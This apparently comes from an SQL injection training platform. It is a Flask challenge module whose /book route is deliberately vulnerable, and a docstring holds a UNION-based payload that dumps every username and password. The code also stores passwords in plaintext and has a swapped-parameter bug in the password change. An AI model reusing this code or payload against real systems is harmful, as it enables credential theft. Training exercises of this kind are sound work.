#!/usr/bin/python3
from functools import wraps
from flask import (
    render_template,
    Blueprint,
    current_app,
    redirect,
    url_for,
    session,
    request,
    flash,
    jsonify
)
from sqli_platform import app, app_log, db
from sqli_platform.utils.challenge import get_config, format_query

"""
The login function has been patched.
The notes function has been patched.
password update function is patched.

Exploit:
challenge7/book?title='+union+select'-1''+union+select+1,2,group_concat(password),group_concat(username)+from+users--

' union select'-1'' union select 1,2,group_concat(password),group_concat(username) from users--

"""

_bp = "challenge7"
challenge7 = Blueprint(
    _bp, __name__, template_folder="templates", url_prefix=f"/{_bp}")
_templ = "challenges/challenge1"
_query = []

@challenge7.context_processor
def sessions():
    """
    
    """
    global _query
    d = dict(
        cname=_bp,
        csession=session.get(f"{_bp}_user_id", None),
        csession_name=session.get(f"{_bp}_username", None),
        ctitle=get_config(f"{_bp}", "title"),
        query=format_query(_query)
    )
    _query = []
    return d


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get(f"{_bp}_user_id", None) is None:
            return redirect(url_for(f"{_bp}.login", next=request.url))
        return f(*args, **kwargs)
    return decorated_function


@challenge7.route("/")
@challenge7.route("/login", methods=["GET", "POST"])
def login():
    global _query

    if request.method == "POST":
        username = request.form["username"].lower()
        password = request.form["password"]

        if not (username and password):
            flash("Username or Password cannot be empty.", "warning")
            return redirect(url_for(f"{_bp}.login"))

        query = "SELECT id, username FROM users WHERE username = ? AND password = ?"
        params = [username, password]
        _query.append((query, params))
        user = db.sql_query(_bp, query, params, one=True)

        if user:
            session[f"{_bp}_user_id"] = user["id"]
            session[f"{_bp}_username"] = user["username"][:30]
            return redirect(url_for(f"{_bp}.home"))
        else:
            flash("Invalid username or password.", "danger")
    return render_template(f"{_templ}/login.html")


@challenge7.route("/signup", methods=["GET", "POST"])
def signup():
    global _query

    if request.method == "POST":
        username = request.form["username"].lower()
        password = request.form["password"]

        if not (username and password):
            flash("Username or Password cannot be empty.")
            return redirect(url_for(f"{_bp}.signup"))

        # No error checking etc...
        query = "SELECT username FROM users WHERE username=?"
        params = [username]
        _query.append((query, params))
        if db.sql_query(_bp, query, params):
            flash("Username already exists.", "danger")
        else:
            query = "INSERT INTO users (username, password) VALUES (?, ?)"
            params = [username, password]
            _query.append((query, params))
            db.sql_insert(_bp, query, params)
            return redirect(url_for(f"{_bp}.login"))
    return render_template(f"{_templ}/registration.html")


@challenge7.route("/home")
@login_required
def home():
    return render_template(f"{_bp}/index.html")


@challenge7.route("/notes", methods=["GET", "POST"])
@login_required
def notes():
    global _query

    query = "SELECT username FROM users WHERE id=?"
    params = [session[f"{_bp}_user_id"]]
    #_query.append((query, params))
    user = db.sql_query(_bp, query, params, one=True)

    if request.method == "POST":
        title = request.form["title"]
        note = request.form["note"]

        query = "INSERT INTO notes (username, title, note) VALUES (?, ?, ?)"
        params = [user["username"], title, note]
        _query.append((query, params))
        db.sql_insert(_bp, query, params)
        return redirect(url_for(f"{_bp}.notes"))

    query = f"SELECT title, note FROM notes WHERE username = ?"
    params = [user['username']]
    _query.append((query, params))
    notes = db.sql_query(_bp, query, params)
    return render_template(f"{_templ}/notes.html", notes=notes, user=user["username"])


@challenge7.route("/changepwd", methods=["GET", "POST"])
@login_required
def changepwd():
    global _query

    if request.method == "POST":
        current_pwd = request.form["current-password"]
        new_pwd = request.form["password"]
        new_pwd2 = request.form["password2"]

        if not (new_pwd == new_pwd2):
            flash("Passwords doesn't match.")
            return redirect(url_for(f"{_bp}.changepwd"))

        query = "SELECT username, password FROM users WHERE id = ?"
        params = [session[f"{_bp}_user_id"]]
        _query.append((query, params))
        user = db.sql_query(_bp, query, params, one=True)

        if not (current_pwd == user["password"]):
            flash("Wrong password supplied.", "danger")
            return redirect(url_for(f"{_bp}.changepwd"))

        query = f"UPDATE users SET password = ? WHERE username = ?"
        params = [user['username'], new_pwd]
        _query.append((query, params))
        db.sql_insert(_bp, query, params)

        flash("Password changed", "info")
        return redirect(url_for(f"{_bp}.changepwd"))
    return render_template(f"{_templ}/updatepwd.html")


@challenge7.route("/logout")
def logout():
    session.clear()
    return redirect(url_for(f"{_bp}.login"))


@challenge7.route("/book", methods=["GET"])
@login_required
def book():
    global _query

    if request.method == "GET":
        title = request.args.get("title", "")
        book = {}

        query = f"SELECT id FROM books WHERE title like '{title}%'"
        _query.append(query)
        bid = db.sql_query(_bp, query, one=True)
        if bid:
            query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
            _query.append(query)
            book = db.sql_query(_bp, query)
        return render_template(f"{_templ}/book.html", data=book)
